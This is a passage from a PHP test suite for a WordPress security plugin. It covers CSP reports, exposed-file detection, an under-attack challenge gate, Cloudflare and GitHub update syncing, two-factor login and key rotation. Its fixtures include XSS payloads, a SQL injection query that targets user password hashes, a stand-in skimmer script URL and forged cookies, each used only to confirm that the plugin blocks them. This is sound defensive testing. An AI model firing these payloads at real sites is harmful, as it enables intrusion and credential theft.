			check( 'enforce mode allows approved domains only', false !== strpos( $csp, 'https://evil-cdn.example' ) );
			Scripts::mark( 'block', array( 'evil-cdn.example/skim.js' ) );
			check( 'a blocked domain leaves the policy', false === strpos( Scripts::policy(), 'evil-cdn.example' ) );
			$report = static function ( $blocked, $from ) {
				return http(
					'POST',
					rest_url( 'chaos-shield/v1/csp' ),
					$from,
					array(
						'headers' => array( 'Content-Type' => 'application/csp-report' ),
						'body'    => wp_json_encode(
							array(
								'csp-report' => array(
									'document-uri'        => home_url( '/shop/' ),
									'blocked-uri'         => $blocked,
									'effective-directive' => 'script-src-elem',
								),
							)
						),
					)
				);
			};
			$r1     = $report( 'https://ads.example/inject.js', ip() );
			$report( 'chrome-extension://abcdef/content.js', ip() );
			$report( 'eval', ip() );
			$items = Scripts::state()['items'];
			check( 'browser reports add scripts loaded later', 204 === $r1['status'] && isset( $items['ads.example/inject.js'] ) && 'new' === $items['ads.example/inject.js']['status'] && in_array( '/shop/', $items['ads.example/inject.js']['pages'], true ) );
			check( 'browser extensions are ignored, eval is listed', ! preg_grep( '/^abcdef/', array_keys( $items ) ) && isset( $items['keyword:eval'] ) && false === strpos( Scripts::policy(), 'unsafe-eval' ) );
			Scripts::mark( 'approve', array( 'keyword:eval' ) );
			check( 'approving eval adds it to the policy', false !== strpos( Scripts::policy(), "'unsafe-eval'" ) );
			$set( array( 'csp_mode' => 'off' ) );
			$before = count( Scripts::state()['items'] );
			$report( 'https://other.example/x.js', ip() );
			check( 'with the policy off, reports are ignored', count( Scripts::state()['items'] ) === $before );

			// Exposed files.
			file_put_contents( ABSPATH . '.env', "APP_KEY=base64:abc\nDB_PASSWORD=hunter2\n" );
			file_put_contents( ABSPATH . 'backup.sql', "-- MySQL dump 10.13\nCREATE TABLE `wp_users` (\n" );
			file_put_contents( $local, "PK\x03\x04 fake" );
			update_site_option( 'sst_inject', '' );
			Page_Check::run();
			$files = Exposure::state()['files'];
			$paths = wp_list_pluck( $files, 'public', 'path' );
			check( 'a downloadable .env and database dump are found', ! empty( $paths['.env'] ) && ! empty( $paths['backup.sql'] ), wp_json_encode( $paths ) );
			check( 'a backup in the uploads folder is listed as on the server', isset( $paths['wp-content/uploads/old-site-backup.zip'] ) && ! $paths['wp-content/uploads/old-site-backup.zip'] );
			check( 'missing files are never reported, whatever the 404 page says', ! isset( $paths['.git/HEAD'] ) && ! isset( $paths['wp-config.php.bak'] ) );
			$dump = md5( 'backup.sql' );
			check( 'a found file can be deleted from the tab', true === Exposure::delete( $dump ) && ! file_exists( ABSPATH . 'backup.sql' ) );
			check( 'only files the check found can be deleted', is_wp_error( Exposure::delete( md5( 'wp-config.php' ) ) ) && file_exists( ABSPATH . 'wp-config.php' ) );

			// Under attack mode.
			Attack_Mode::manual( true );
			$visitor = ip();
			$gate    = http( 'GET', '/', $visitor, array( 'headers' => $browser ) );
			check( 'under attack, browsers get the browser check', 503 === $gate['status'] && false !== strpos( $gate['body'], 'name="cshield_pow"' ) && false !== strpos( $gate['body'], 'window.cshieldPow' ) );
			$bot = http( 'GET', '/', ip() );
			check( 'scripts get a short busy answer', 503 === $bot['status'] && 0 === strpos( $bot['body'], '503' ) );
			check( 'the REST API is left to its own rate limit', 200 === http( 'GET', rest_url( '/' ), ip() )['status'] );
			$admin = user();
			if ( is_multisite() ) {
				grant_super_admin( $admin->ID );
			}
			check( 'logged-in users are never checked', 200 === http( 'GET', '/', ip(), array( 'cookies' => admin_cookies( $admin->ID ) ) )['status'] );
			preg_match( '/name="cshield_pow" value="([^"]+)"/', $gate['body'], $m );
			$challenge = isset( $m[1] ) ? html_entity_decode( $m[1] ) : '';
			$nonce     = 0;
			while ( $challenge && 0 !== strpos( hash( 'sha256', $challenge . ':' . $nonce ), str_repeat( '0', Attack_Mode::ZEROS ) ) && $nonce < 5000000 ) {
				++$nonce;
			}
			check( 'a wrong answer or a forged challenge is refused', ! Attack_Mode::solved( $challenge, (string) ( $nonce + 1 ) . 'x' ) && ! Attack_Mode::solved( preg_replace( '/\.[0-9a-f]+$/', '.' . str_repeat( 'a', 32 ), $challenge ), (string) $nonce ) );
			$pass   = http(
				'POST',
				'/',
				$visitor,
				array(
					'headers' => $browser,
					'body'    => array(
						'cshield_pow'   => $challenge,
						'cshield_nonce' => (string) $nonce,
					),
				)
			);
			$cookie = isset( $pass['cookies'][ Attack_Mode::COOKIE ] ) ? $pass['cookies'][ Attack_Mode::COOKIE ] : '';
			check( 'solving the check gives a pass and sends the visitor on', 303 === $pass['status'] && '' !== $cookie );
			$in = http( 'GET', '/', $visitor, array( 'headers' => $browser, 'cookies' => array( Attack_Mode::COOKIE => $cookie ) ) ); // phpcs:ignore WordPress.Arrays.ArrayDeclarationSpacing.AssociativeArrayFound -- Short test call.
			check( 'with the pass, pages load', 200 === $in['status'] );
			$other = http( 'GET', '/', $visitor, array( 'headers' => $browser + array( 'User-Agent' => 'curl/8.0' ), 'cookies' => array( Attack_Mode::COOKIE => $cookie ) ) ); // phpcs:ignore WordPress.Arrays.ArrayDeclarationSpacing.AssociativeArrayFound -- Short test call.
			check( 'a pass copied to another program does not work', 503 === $other['status'] );
			$far = http( 'GET', '/', '45.34.' . wp_rand( 1, 254 ) . '.9', array( 'headers' => $browser, 'cookies' => array( Attack_Mode::COOKIE => $cookie ) ) ); // phpcs:ignore WordPress.Arrays.ArrayDeclarationSpacing.AssociativeArrayFound -- Short test call.
			check( 'a pass shared with another network does not work', 503 === $far['status'] );
			$again = http(
				'POST',
				'/',
				ip(),
				array(
					'headers' => $browser,
					'body'    => array(
						'cshield_pow'   => $challenge,
						'cshield_nonce' => (string) $nonce,
					),
				)
			);
			check( 'one solved check buys one pass only', empty( $again['cookies'][ Attack_Mode::COOKIE ] ) );
			$sneak  = http( 'GET', '/?x=/wp-json/', ip(), array( 'headers' => $browser ) );
			$sneak2 = http( 'GET', '/?robots.txt', ip(), array( 'headers' => $browser ) );
			check( 'the query string cannot make a page look like the REST API or robots.txt', 503 === $sneak['status'] && 503 === $sneak2['status'] );
			Attack_Mode::manual( false );
			check( 'switched off, everyone gets in again', 200 === http( 'GET', '/', ip(), array( 'headers' => $browser ) )['status'] );
			$set( array( 'force_https' => true ) );
			$plain = http( 'GET', '/', ip() );
			$edge  = http( 'GET', '/', ip(), array( 'headers' => array( 'CF-Visitor' => '{"scheme":"https"}' ) ) );
			$set( array( 'force_https' => false ) );
			check( 'HTTPS redirects never loop behind a proxy that already used HTTPS', 301 === $plain['status'] && 200 === $edge['status'] );
			$set(
				array(
					'attack_auto'      => true,
					'attack_threshold' => 20,
				)
			);
			for ( $i = 0; $i < 30; $i++ ) {
				if ( Attack_Mode::state()['on'] ) {
					break;
				}
				http( 'GET', '/?id=1%20UNION%20SELECT%20user_pass%20FROM%20wp_users', ip() );
				wp_cache_flush();
			}
			$auto = Attack_Mode::state();
			check( 'a flood of blocked requests switches it on by itself', $auto['on'] && $auto['auto'] && $auto['until'] > time() );
			Network::update_option( Attack_Mode::OPTION, array_merge( $auto, array( 'until' => time() - 1 ) ) );
			check( 'an automatic run ends on its own', ! Attack_Mode::active() && ! Attack_Mode::state()['on'] );
			$set( array( 'attack_auto' => false ) );

			// Cloudflare.
			$zone  = 'abcdef0123456789abcdef0123456789';
			$route = static function ( $result, $code = 200 ) {
				return array(
					'code' => $code,
					'body' => wp_json_encode(
						array(
							'success' => $code < 300,
							'result'  => $result,
							'errors'  => $code < 300 ? array() : array( array( 'message' => 'Authentication error' ) ),
						)
					),
				);
			};
			update_site_option(
				'sst_http_mock',
				array(
					'api.cloudflare.com' => array(
						'routes' => array(
							'GET /client/v4/user/tokens/verify'                    => $route( array( 'status' => 'active' ) ),
							'GET /client/v4/zones?name=localhost'                 => $route(
								array(
									array(
										'id'     => $zone,
										'name'   => 'localhost',
										'status' => 'active',
										'plan'   => array( 'name' => 'Free Website' ),
									),
								)
							),
							'GET /client/v4/zones/' . $zone . '/settings/security_level' => $route( array( 'value' => 'medium' ) ),
							'GET /client/v4/zones/' . $zone . '/settings/ssl'      => $route( array( 'value' => 'flexible' ) ),
							'GET /client/v4/zones/' . $zone . '/settings/always_use_https' => $route( array( 'value' => 'off' ) ),
							'PATCH /client/v4/zones/' . $zone . '/settings/'       => $route( array( 'value' => 'x' ) ),
							'GET /client/v4/zones/' . $zone . '/firewall/access_rules' => $route( array() ),
							'POST /client/v4/zones/' . $zone . '/firewall/access_rules' => $route( array( 'id' => 'rule0123456789' ) ),
							'DELETE /client/v4/zones/' . $zone . '/firewall/access_rules/rules/' => $route( array( 'id' => 'rule0123456789' ) ),
						),
					),
				)
			);
			check( 'a Global API Key or junk is refused', is_wp_error( Cloudflare::connect( 'not a token' ) ) && ! Cloudflare::connected() );
			$msg = Cloudflare::connect( str_repeat( 'Ab1_', 10 ) );
			$z   = Cloudflare::zone();
			check( 'a token connects to the site\'s zone and reads its settings', ! is_wp_error( $msg ) && Cloudflare::connected() && $zone === $z['id'] && ! empty( $z['can']['firewall'] ) && 'flexible' === Cloudflare::status()['ssl'], is_wp_error( $msg ) ? $msg->get_error_message() : '' );
			$token = Network::get_option( Cloudflare::TOKEN );
			check( 'the token is stored encrypted', $token && false === strpos( (string) $token, str_repeat( 'Ab1_', 10 ) ) );
			$enemy = ip();
			Bans::ban( $enemy, 'test' );
			check( 'a ban queues a Cloudflare sync', (bool) Network::next_scheduled( Cloudflare::HOOK, array( 'soon' ) ) );
			update_site_option( 'sst_http_log', array() );
			Cloudflare::sync();
			$posts = array_filter(
				$log(),
				static function ( $l ) use ( $enemy ) {
					return 'POST' === $l['method'] && false !== strpos( $l['body'], '"value":"' . $enemy . '"' );
				}
			); // phpcs:ignore Squiz.Functions.MultiLineFunctionDeclaration -- Short test callback.
			check( 'banned IPs become Cloudflare block rules', 1 === count( $posts ) && isset( Cloudflare::rules()[ $enemy ] ) );
			Bans::release( $enemy );
			update_site_option( 'sst_http_log', array() );
			Cloudflare::sync();
			$dels = array_filter(
				$log(),
				static function ( $l ) {
					return 'DELETE' === $l['method'];
				}
			); // phpcs:ignore Squiz.Functions.MultiLineFunctionDeclaration -- Short test callback.
			check( 'a lifted ban comes off Cloudflare', 1 === count( $dels ) && ! isset( Cloudflare::rules()[ $enemy ] ) );
			update_site_option( 'sst_http_log', array() );
			Cloudflare::attack( true );
			$patch = array_values(
				array_filter(
					$log(),
					static function ( $l ) {
						return 'PATCH' === $l['method'];
					}
				)
			); // phpcs:ignore Squiz.Functions.MultiLineFunctionDeclaration -- Short test callback.
			check( 'under attack mode switches on Cloudflare\'s Under Attack mode', $patch && false !== strpos( $patch[0]['body'], 'under_attack' ) && 'medium' === Cloudflare::status()['previous_level'] );
			update_site_option( 'sst_http_mock', array_merge_recursive( get_site_option( 'sst_http_mock' ), array( 'api.cloudflare.com' => array( 'routes' => array( 'GET /client/v4/zones/' . $zone . '/settings/security_level' => $route( array( 'value' => 'under_attack' ) ) ) ) ) ) );
			$mock = get_site_option( 'sst_http_mock' );
			$mock['api.cloudflare.com']['routes'][ 'GET /client/v4/zones/' . $zone . '/settings/security_level' ] = $route( array( 'value' => 'under_attack' ) );
			update_site_option( 'sst_http_mock', $mock );
			update_site_option( 'sst_http_log', array() );
			Cloudflare::attack( false );
			$patch = array_values(
				array_filter(
					$log(),
					static function ( $l ) {
						return 'PATCH' === $l['method'];
					}
				)
			); // phpcs:ignore Squiz.Functions.MultiLineFunctionDeclaration -- Short test callback.
			check( 'and puts the level back afterwards', $patch && false !== strpos( $patch[0]['body'], '"medium"' ) );
			Cloudflare::disconnect();
			check( 'disconnecting removes the token', ! Cloudflare::connected() && ! Network::get_option( Cloudflare::TOKEN ) );

			// Ban list feed and HTTPS.
			$listed = ip();
			Bans::ban( $listed, 'test' );
			$url = Edge::feed_url();
			$off = http( 'GET', $url, ip() );
			$set( array( 'ban_feed' => true ) );
			$feed = http( 'GET', $url, ip() );
			$bad  = http( 'GET', add_query_arg( 'key', 'wrong', $url ), ip() );
			check( 'the ban list feed is private and lists banned IPs', 404 === $off['status'] && 200 === $feed['status'] && false !== strpos( $feed['body'], $listed ) && 404 === $bad['status'] );
			Bans::release( $listed );
			$mixed = Https::mixed( '<img src="http://cdn.example/a.png"><link rel="stylesheet" href="http://cdn.example/s.css"><link rel="canonical" href="http://example.com/"><a href="http://example.com/">x</a>' );
			check( 'mixed content finds http files but not plain links', 2 === count( $mixed ) );
			check( 'HTTPS redirects refuse to switch on without a working certificate', true !== Https::can_force() );
		} finally {
			foreach ( $planted as $file ) {
				if ( file_exists( $file ) ) {
					unlink( $file );
				}
			}
			if ( file_exists( $local ) ) {
				unlink( $local );
			}
			Attack_Mode::manual( false );
			delete_site_option( 'sst_inject' );
			delete_site_option( 'sst_http_mock' );
			foreach ( $saved as $option => $value ) {
				false === $value || null === $value ? Network::delete_option( $option ) : Network::update_option( $option, $value, false );
			}
			$set(
				array(
					'csp_mode'    => 'off',
					'attack_auto' => false,
					'ban_feed'    => false,
				)
			);
		}
	}
);

group(
	'Admin screens',
	function () {
		$evil = '<img src=x onerror=alert(1)>';
		login( $evil, 'x', ip() );
		http( 'GET', '/?p=1&q=' . rawurlencode( '"><svg onload=alert(2)>' ), ip(), array( 'headers' => array( 'User-Agent' => '<script>alert(3)</script>' ) ) );
		$admin = user();
		if ( is_multisite() ) {
			grant_super_admin( $admin->ID );
		}
		$cookies = admin_cookies( $admin->ID );
		$me      = ip();
		foreach ( array( 'activity', 'siem', 'traffic', 'overview', 'hub', 'access', 'firewall', 'backups', 'hardening', 'help', 'edge' ) as $tab ) {
			$page = http( 'GET', Network::admin_url( 'admin.php?page=chaos-shield&tab=' . $tab ), $me, array( 'cookies' => $cookies ) );
			check(
				'the ' . $tab . ' tab loads and escapes attacker text',
				200 === $page['status'] && false === strpos( $page['body'], '<img src=x onerror' ) && false === strpos( $page['body'], '<svg onload' ) && false === strpos( $page['body'], '<script>alert(3)' ),
				'status ' . $page['status']
			);
		}
		$no_nonce = http(
			'POST',
			admin_url( 'admin-post.php' ),
			$me,
			array(
				'cookies' => $cookies,
				'body'    => array(
					'action' => 'cshield_rules',
					'rules'  => array(),
				),
			)
		);
		check( 'settings forms refuse requests without a nonce', in_array( $no_nonce['status'], array( 403, 400 ), true ) && array() === (array) Settings::get( 'siem_rules_off' ) );

		$editor = user( 'editor' );
		$page   = http( 'GET', Network::admin_url( 'admin.php?page=chaos-shield' ), $me, array( 'cookies' => admin_cookies( $editor->ID ) ) );
		check( 'editors cannot open the plugin', 200 !== $page['status'] || false === strpos( $page['body'], 'cshield-tabs' ) );
	}
);

group(
	'Updates from GitHub',
	function () {
		$file    = plugin_basename( CSHIELD_FILE );
		$api     = '/repos/' . Updater::repo();
		$release = static function ( $tag, array $extra = array() ) use ( $api ) {
			return array(
				'code' => 200,
				'body' => wp_json_encode(
					array_merge(
						array(
							'tag_name'     => $tag,
							'html_url'     => 'https://github.com/' . Updater::repo() . '/releases/tag/' . $tag,
							'body'         => "Big release\n* Fixed <script>alert(1)</script>\n* Faster scans",
							'published_at' => '2026-10-21T10:00:00Z',
							'assets'       => array(
								array(
									'name'                 => 'chaos-shield-' . ltrim( $tag, 'v' ) . '.zip',
									'url'                  => 'https://api.github.com' . $api . '/releases/assets/123',
									'browser_download_url' => 'https://github.com/' . Updater::repo() . '/releases/download/' . $tag . '/chaos-shield.zip',
								),
							),
						),
						$extra
					)
				),
			);
		};
		$mock    = static function ( $latest ) use ( $api ) {
			Network::delete_transient( Updater::RELEASE );
			delete_site_transient( 'update_plugins' );
			delete_site_option( 'sst_http_log' );
			update_site_option(
				'sst_http_mock',
				array(
					'api.github.com'      => array(
						'routes' => array(
							'GET ' . $api . '/releases/latest'     => $latest,
							'GET ' . $api . '/releases/assets/123' => array(
								'code'    => 302,
								'body'    => '',
								'headers' => array( 'location' => 'https://objects.example.com/signed/chaos-shield.zip' ),
							),
						),
					),
					'objects.example.com' => array( 'body' => 'PK-zip-bytes' ),
					'api.wordpress.org'   => array( 'body' => '{"plugins":{},"translations":[],"no_update":{}}' ),
				)
			);
		};
		$calls   = static function ( $host ) {
			return array_values(
				array_filter(
					(array) get_site_option( 'sst_http_log', array() ),
					static function ( $r ) use ( $host ) {
						return false !== strpos( $r['url'], $host );
					}
				)
			);
		};
		$offered = static function () use ( $file ) {
			wp_update_plugins();
			$t = get_site_transient( 'update_plugins' );
			return isset( $t->response[ $file ] ) ? $t->response[ $file ] : null;
		};

		try {
			$mock( $release( 'v99.0.0' ) );
			$up = $offered();
			check( 'a newer GitHub release shows as a plugin update', $up && '99.0.0' === $up->new_version && false !== strpos( $up->package, '/releases/download/v99.0.0/' ) );
			$org = $calls( 'api.wordpress.org/plugins/update-check' );
			check( 'WordPress.org is told the plugin updates from GitHub', $org && false !== strpos( urldecode( $org[0]['body'] ), 'github.com\\/JugglingChaos\\/chaos-shield' ) );
			$before = count( $calls( 'api.github.com' ) );
			Updater::latest();
			check( 'the release is cached instead of asking GitHub every time', count( $calls( 'api.github.com' ) ) === $before );

			require_once ABSPATH . 'wp-admin/includes/plugin-install.php';
			$info = plugins_api( 'plugin_information', array( 'slug' => dirname( $file ) ) );
			check( 'View details shows the release notes, escaped', ! is_wp_error( $info ) && '99.0.0' === $info->version && false !== strpos( $info->sections['changelog'], '<li>Faster scans</li>' ) && false === strpos( $info->sections['changelog'], '<script>' ) );

			$mock( $release( 'v' . CSHIELD_VERSION ) );
			check( 'the same version is not offered', null === $offered() );
			$mock( $release( 'v99.0.0', array( 'prerelease' => true ) ) );
			check( 'a pre-release is not offered', null === $offered() );
			$mock( $release( 'v99.0.0', array( 'assets' => array() ) ) );
			check( 'a release without a zip is not offered', null === $offered() );
			$mock(
				$release(
					'v99.0.0',
					array(
						'assets' => array(
							array(
								'name'                 => 'wporg-chaos-shield-99.0.0.zip',
								'url'                  => 'https://api.github.com' . $api . '/releases/assets/124',
								'browser_download_url' => 'https://github.com/' . Updater::repo() . '/releases/download/v99.0.0/wporg-chaos-shield-99.0.0.zip',
							),
						),
					)
				)
			);
			check( 'the WordPress.org copy, which has no GitHub updater, is never offered', null === $offered() );
			$mock(
				array(
					'code' => 500,
					'body' => 'oops',
				)
			);
			check( 'GitHub being down offers nothing and breaks nothing', null === $offered() && null === Updater::latest() );

			$mock( $release( 'v99.0.0' ) );
			define( 'CSHIELD_GITHUB_TOKEN', 'github_pat_test' );
			$up = $offered();
			check( 'with a token the download goes through the GitHub API', $up && 0 === strpos( $up->package, 'https://api.github.com' ) && ! empty( $calls( 'api.github.com' )[0]['auth'] ) );
			$path = Updater::download( false, $up->package );
			$hops = $calls( 'objects.example.com' );
			check( 'the signed download is fetched without the token', is_string( $path ) && 'PK-zip-bytes' === file_get_contents( $path ) && $hops && empty( $hops[0]['auth'] ) );
			if ( is_string( $path ) ) {
				wp_delete_file( $path );
			}
			check( 'other downloads are left alone', false === Updater::download( false, 'https://downloads.wordpress.org/plugin/akismet.zip' ) );
		} finally {
			delete_site_option( 'sst_http_mock' );
			delete_site_option( 'sst_http_log' );
			Network::delete_transient( Updater::RELEASE );
			delete_site_transient( 'update_plugins' );
		}
	}
);

group(
	'Accounts',
	function () {
		$session = function ( $user_id, array $extra = array() ) {
			$expire  = time() + HOUR_IN_SECONDS;
			$manager = \WP_Session_Tokens::get_instance( $user_id );
			$token   = $manager->create( $expire );
			if ( $extra ) {
				$manager->update( $token, array_merge( $manager->get( $token ), $extra ) );
			}
			return array(
				'token'   => $token,
				'cookies' => array(
					AUTH_COOKIE      => wp_generate_auth_cookie( $user_id, $expire, 'auth', $token ),
					LOGGED_IN_COOKIE => wp_generate_auth_cookie( $user_id, $expire, 'logged_in', $token ),
				),
			);
		};
		$set     = function ( array $changes ) {
			Network::update_option( Settings::OPTION, array_merge( Settings::all(), $changes ) );
			Settings::forget();
		};

		// Two-factor or a passkey required for administrators.
		$set(
			array(
				'tf_required'   => 'admins',
				'tf_grace_days' => 0,
			)
		);
		$late = user();
		$s    = $session( $late->ID );
		$home = http( 'GET', '/wp-admin/', ip(), array( 'cookies' => $s['cookies'] ) );
		check( 'an admin without a second step past the grace period is sent to their profile', 302 === $home['status'] && false !== strpos( $home['location'], 'profile.php' ) );
		check( 'their profile still opens, to set it up', 200 === http( 'GET', '/wp-admin/profile.php', ip(), array( 'cookies' => $s['cookies'] ) )['status'] );
		$ajax = http(
			'POST',
			'/wp-admin/admin-ajax.php',
			ip(),
			array(
				'cookies' => $s['cookies'],
				'body'    => array( 'action' => 'sst_anything' ),
			)
		);
		check( 'other dashboard actions are refused meanwhile', 403 === $ajax['status'] );
		$editor = user( 'editor' );
		check( 'an editor is not covered by an administrators rule', 200 === http( 'GET', '/wp-admin/', ip(), array( 'cookies' => $session( $editor->ID )['cookies'] ) )['status'] );
		update_user_meta( $late->ID, Two_Factor::META_SECRET, Totp::seal( Totp::new_secret() ) );
		check( 'once two-factor is on the dashboard opens again', 200 === http( 'GET', '/wp-admin/', ip(), array( 'cookies' => $s['cookies'] ) )['status'] );

		$set( array( 'tf_grace_days' => 7 ) );
		$fresh = user();
		$page  = http( 'GET', '/wp-admin/', ip(), array( 'cookies' => $session( $fresh->ID )['cookies'] ) );
		$due   = (int) get_user_meta( $fresh->ID, Two_Factor::META_DUE, true );
		check( 'during the grace period the dashboard opens with a reminder', 200 === $page['status'] && false !== strpos( $page['body'], 'requires a second login step' ) );
		check( 'the grace period starts when the rule first meets the account', $due > time() + 6 * DAY_IN_SECONDS && $due <= time() + 7 * DAY_IN_SECONDS );
		$set( array( 'tf_required' => 'off' ) );

		// Trusted browsers.
		$set( array( 'tf_trust_days' => 30 ) );
		$user   = user();
		$pass   = password( $user );
		$secret = Totp::new_secret();
		update_user_meta( $user->ID, Two_Factor::META_SECRET, Totp::seal( $secret ) );
		$from = ip();
		$name = 'cshield_trust_' . COOKIEHASH;
		$step = login( $user->user_login, $pass, $from );
		$form = http( 'GET', $step['location'], $from );
		check( 'the code step offers to trust the browser', false !== strpos( $form['body'], 'name="cshield_trust"' ) );
		$trusted = http(
			'POST',
			$step['location'],
			$from,
			array(
				'body' => array(
					'cshield_code'  => Totp::code( $secret, (int) floor( time() / 30 ) ),
					'cshield_trust' => '1',
				),
			)
		);
		check( 'trusting the browser logs in and sets its cookie', logged_in( $trusted ) && ! empty( $trusted['cookies'][ $name ] ) );
		$cookie = array( $name => isset( $trusted['cookies'][ $name ] ) ? $trusted['cookies'][ $name ] : '' );
		$again  = http(
			'POST',
			'/wp-login.php',
			$from,
			array(
				'cookies' => $cookie,
				'body'    => array(
					'log' => $user->user_login,
					'pwd' => $pass,
				),
			)
		);
		check( 'a trusted browser skips the code step', logged_in( $again ) );
		$forged = http(
			'POST',
			'/wp-login.php',
			$from,
			array(
				'cookies' => array( $name => $user->ID . '.forged.' . str_repeat( 'a', 40 ) ),
				'body'    => array(
					'log' => $user->user_login,
					'pwd' => $pass,
				),
			)
		);
		check( 'a forged trust cookie still gets the code step', ! logged_in( $forged ) && false !== strpos( $forged['location'], 'action=cshield_2fa' ) );
		$pass  = password( $user );
		$after = http(
			'POST',
			'/wp-login.php',
			$from,
			array(
				'cookies' => $cookie,
				'body'    => array(
					'log' => $user->user_login,
					'pwd' => $pass,
				),
			)
		);
		check( 'a new password forgets the trusted browser', ! logged_in( $after ) );
		$set( array( 'tf_trust_days' => 0 ) );
		check( 'with trust switched off no browser skips the code', ! Two_Factor::trusted_list( $user->ID ) );

		// Idle sign out.
		$set(
			array(
				'idle_minutes' => 10,
				'idle_roles'   => 'staff',
			)
		);
		$idle = user();
		$old  = $session( $idle->ID, array( Accounts::SEEN => time() - HOUR_IN_SECONDS ) );
		$out  = http( 'GET', '/wp-admin/', ip(), array( 'cookies' => $old['cookies'] ) );
		check( 'an idle session is signed out', false !== strpos( $out['location'], 'cshield_idle' ) && null === \WP_Session_Tokens::get_instance( $idle->ID )->get( $old['token'] ) );
		$busy = $session( $idle->ID, array( Accounts::SEEN => time() - 120 ) );
		check( 'an active session stays signed in', 200 === http( 'GET', '/wp-admin/', ip(), array( 'cookies' => $busy['cookies'] ) )['status'] );
		$seen = \WP_Session_Tokens::get_instance( $idle->ID )->get( $busy['token'] );
		check( 'and its activity is noted', isset( $seen[ Accounts::SEEN ] ) && $seen[ Accounts::SEEN ] >= time() - 60 );
		$set( array( 'idle_minutes' => 0 ) );

		// Approval of new sign-ups.
		$set( array( 'approve_signups' => true ) );
		if ( ! is_multisite() ) {
			$open = get_option( 'users_can_register' );
			update_option( 'users_can_register', 1 );
			$login = 'sst_signup_' . strtolower( wp_generate_password( 6, false ) );
			http(
				'POST',
				'/wp-login.php?action=register',
				ip(),
				array(
					'body' => array(
						'user_login' => $login,
						'user_email' => $login . '@example.invalid',
						'wp-submit'  => 'Register',
					),
				)
			);
			update_option( 'users_can_register', $open );
			$made = get_user_by( 'login', $login );
			if ( $made ) {
				$GLOBALS['sst']['users'][] = $made->ID;
			}
			check( 'an account a visitor makes waits for approval', $made && Accounts::pending( $made->ID ) );
		}
		check( 'accounts made by an administrator do not wait', ! Accounts::pending( user( 'subscriber' )->ID ) );
		$held = user( 'subscriber' );
		$pass = password( $held );
		update_user_meta( $held->ID, Accounts::PENDING, time() );
		$try = login( $held->user_login, $pass, ip() );
		check( 'a held account cannot log in, even with the right password', ! logged_in( $try ) && false !== strpos( $try['body'], 'waiting for approval' ) );
		$wrong = login( $held->user_login, 'wrong-pass', ip() );
		check( 'a wrong password does not reveal that the account is held', false === strpos( $wrong['body'], 'waiting for approval' ) );
		check( 'approving the account lets it log in', Accounts::approve( $held->ID ) && logged_in( login( $held->user_login, $pass, ip() ) ) );
		update_user_meta( $held->ID, Accounts::PENDING, time() );
		$s2 = $session( $held->ID );
		http( 'GET', '/', ip(), array( 'cookies' => $s2['cookies'] ) );
		check( 'a held account that a plugin logged in is signed out', ! \WP_Session_Tokens::get_instance( $held->ID )->get_all() );
		delete_user_meta( $held->ID, Accounts::PENDING );
		$set( array( 'approve_signups' => false ) );

		// Public names.
		$named = user( 'author' );
		wp_update_user(
			array(
				'ID'           => $named->ID,
				'display_name' => $named->user_login,
			)
		);
		check( 'an author publishing under their username is flagged', in_array( $named->user_login, Accounts::public_logins(), true ) );
	}
);

group(
	'Security keys',
	function () {
		$ready = Salts::can_rotate();
		if ( is_wp_error( $ready ) ) {
			check( 'a read-only or unusual wp-config.php is refused with a reason', '' !== $ready->get_error_message() );
			check( 'the lines to paste by hand hold eight keys', 8 === substr_count( Salts::block(), 'define(' ) );
			return;
		}
		$path    = Salts::config_path();
		$before  = file_get_contents( $path );
		$options = array( \ChaosShield\Cloudflare::TOKEN, Api::SEALED, \ChaosShield\Connections::CHAT_URL, Hub::SITES_OPTION );
		foreach ( Captcha::providers() as $provider ) {
			$options[] = $provider['secret'];
		}
		$saved = array();
		foreach ( $options as $option ) {
			$saved[ $option ] = Network::get_option( $option, null );
		}
		$metas = array();
		foreach ( array( Two_Factor::META_SECRET, Two_Factor::META_PENDING ) as $meta ) {
			foreach ( get_users(
				array(
					'meta_key' => $meta, // phpcs:ignore WordPress.DB.SlowDBQuery.slow_db_query_meta_key -- Test setup.
					'fields'   => 'ID',
					'number'   => -1,
					'blog_id'  => 0,
				)
			) as $id ) {
				$metas[] = array( (int) $id, $meta, get_user_meta( (int) $id, $meta, true ) );
			}
		}
		try {
			$user   = user();
			$pass   = password( $user );
			$secret = Totp::new_secret();
			update_user_meta( $user->ID, Two_Factor::META_SECRET, Totp::seal( $secret ) );
			$metas[] = array( $user->ID, Two_Factor::META_SECRET, get_user_meta( $user->ID, Two_Factor::META_SECRET, true ) );
			Network::update_option( \ChaosShield\Cloudflare::TOKEN, Totp::seal( 'sst-cf-token' ), false );
			$expire  = time() + HOUR_IN_SECONDS;
			$token   = \WP_Session_Tokens::get_instance( $user->ID )->create( $expire );
			$cookies = array(
				AUTH_COOKIE      => wp_generate_auth_cookie( $user->ID, $expire, 'auth', $token ),
				LOGGED_IN_COOKIE => wp_generate_auth_cookie( $user->ID, $expire, 'logged_in', $token ),
			);
			check( 'a session works before the keys change', 200 === http( 'GET', '/wp-admin/', ip(), array( 'cookies' => $cookies ) )['status'] );

			$done  = Salts::rotate( 'test' );
			$after = file_get_contents( $path );
			$fresh = 0;
			foreach ( Salts::NAMES as $name ) {
				$fresh += (int) ( preg_match( "/define\( '" . $name . "', '([^']{64})' \);/", $after, $m ) && constant( $name ) !== $m[1] );
			}
			check( 'all eight keys are replaced in wp-config.php', true === $done && 8 === $fresh );
			// The test server caches compiled files for up to two seconds.
			sleep( 3 );
			check( 'the site still loads with the new file', 200 === http( 'GET', '/', ip() )['status'] );
			check( 'sessions from before stop working', 200 !== http( 'GET', '/wp-admin/', ip(), array( 'cookies' => $cookies ) )['status'] );
			$from = ip();
			$step = login( $user->user_login, $pass, $from );
			$ok   = http( 'POST', $step['location'], $from, array( 'body' => array( 'cshield_code' => Totp::code( $secret, (int) floor( time() / 30 ) ) ) ) );
			check( 'two-factor keeps working with the new keys', logged_in( $ok ) );
			preg_match( "/define\( 'SECURE_AUTH_KEY', '([^']+)' \);/", $after, $k );
			preg_match( "/define\( 'SECURE_AUTH_SALT', '([^']+)' \);/", $after, $t );
			check( 'connected services are sealed with the new keys', 'sst-cf-token' === Totp::open( Network::get_option( \ChaosShield\Cloudflare::TOKEN ), Totp::key_for( $k[1] . $t[1] ) ) );
		} finally {
			// Put the old keys back, with the secrets as they were sealed for them.
			file_put_contents( $path, $before );
			if ( function_exists( 'opcache_invalidate' ) ) {
				opcache_invalidate( $path, true );
			}
			foreach ( $saved as $option => $value ) {
				null === $value ? Network::delete_option( $option ) : Network::update_option( $option, $value, false );
			}
			foreach ( $metas as $row ) {
				update_user_meta( $row[0], $row[1], $row[2] );
